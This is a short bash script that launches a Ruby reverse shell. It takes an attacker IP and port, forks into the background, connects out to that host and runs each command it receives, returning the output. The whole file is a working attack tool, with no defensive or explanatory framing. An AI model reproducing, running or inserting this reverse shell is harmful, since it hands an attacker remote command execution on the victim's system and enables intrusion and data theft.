#!/bin/bash
# reverse_shell_ruby.sh - Reverse shell using Ruby.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching Ruby reverse shell to $1:$2..."
ruby -rsocket -e 'exit if fork; c=TCPSocket.new(ARGV.shift,ARGV.shift.to_i); while(cmd=c.gets){ IO.popen(cmd,"r"){|io| c.print io.read} }' $1 $2
